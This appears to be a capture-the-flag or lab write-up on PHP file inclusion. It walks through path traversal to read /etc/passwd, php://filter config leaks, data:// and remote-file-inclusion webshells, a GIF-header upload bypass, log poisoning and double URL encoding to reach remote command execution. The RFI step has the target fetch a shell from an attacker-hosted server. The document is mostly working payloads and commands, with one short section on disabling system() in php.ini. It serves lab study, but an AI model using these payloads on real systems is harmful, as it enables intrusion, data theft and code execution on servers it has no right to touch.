
# File Inclusion

### 1. Identify Users via LFI

**Question:** Find the name of a user on the system that starts with `b`

```text
http://83.136.253.132:31153/index.php?language=../../../../etc/passwd
```

→ Parse `/etc/passwd` output and look for usernames starting with **b**.

---

### 2. Read Flag File via LFI

**Question:** Submit the contents of `flag.txt` in `/usr/share/flags`

```text
http://83.136.253.132:31153/index.php?language=../../../../usr/share/flags/flag.txt
```

---

### 3. Fuzz for PHP Scripts & Read Config

**Goal:** Discover PHP files and read a configuration file to extract DB password

```bash
ffuf -u http://94.237.58.137:42480/FUZZ.php \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt \
-ac -t 10
```

Read config using PHP wrapper:

```text
http://94.237.58.137:42480/index.php?language=php://filter/read=convert.base64-encode/resource=configure
```

→ Base64 decode output → **flag / DB password**

---

### 4. RCE via `data://` Wrapper

**Goal:** Execute commands and read flag in `/`

```text
http://94.237.49.209:35916/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=cat+/37809e2f8952f06139011994726d9ef1.txt
```

---

### 5. RCE via Remote File Inclusion (RFI)

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server <PORT>
```

```text
http://10.129.29.114/index.php?language=http://10.10.14.69/shell.php&cmd=cat+/exercise/flag.txt
```

---

### 6. RCE via Image Upload (GIF Header Bypass)

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

```text
http://94.237.56.175:36601/index.php?language=./profile_images/shell.gif&cmd=cat+/2f40d853e2d4768d87da1c81772bae0a.txt
```

---

### 7. Log Poisoning → RCE

**Inject PHP into User-Agent**

```http
User-Agent: <?php system($_GET["cmd"]);?>
```

Trigger via access log:

```http
GET /index.php?language=/var/log/apache2/access.log&cmd=pwd
```

---

### 8. Parameter Fuzzing → LFI

```bash
ffuf -u "http://94.237.120.119:43020/index.php?FUZZ=value" \
-w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-ac -t 100 -ic
```

Exploit discovered parameter:

```bash
ffuf -u "http://94.237.120.119:43020/index.php?view=FUZZ" \
-w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
-ac -t 100 -ic
```

```text
curl "http://94.237.120.119:43020/index.php?view=../../../../flag.txt"
```

---

### 9. Locate php.ini

```bash
ssh htb-student@10.129.29.112
php --ini
```

---

### 10. Disable `system()` & Read Error Logs

```bash
sudo nano /etc/php/7.4/apache2/php.ini
```

```text
disable_functions = system()
```

```bash
sudo systemctl restart apache2
echo "<?php system('ls'); ?>" | sudo tee /var/www/html/test.php
curl http://localhost/test.php
```

Check:

```text
/var/log/apache2/error.log
```

**Answer:** system() disabled for **security** reasons

---

## Advanced LFI → Upload → Double URL Encoding → RCE

### Discovery

```bash
ffuf -u http://94.237.53.134:49731/api/image.php?p=FUZZ \
-w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -ac -t 100 -ic
```

```text
/api/image.php → uses file_get_contents
/api/application.php → uploads file to /uploads/<md5>.<ext>
/contact.php → LFI vulnerable via `region`
```

---

### Double URL Encoding Bypass

```text
%252e → .
%252f → /
```

Upload shell:

```bash
md5sum shell.php
```

Exploit:

```text
http://94.237.61.248:54777/contact.php?region=%252e%252e%252fuploads%252f<md5>&cmd=ls
```

Read flag:

```text
curl "http://94.237.61.248:54777/contact.php?region=%252e%252e%252fuploads%252f<md5>&cmd=cat+/flag_09ebca.txt"
```

---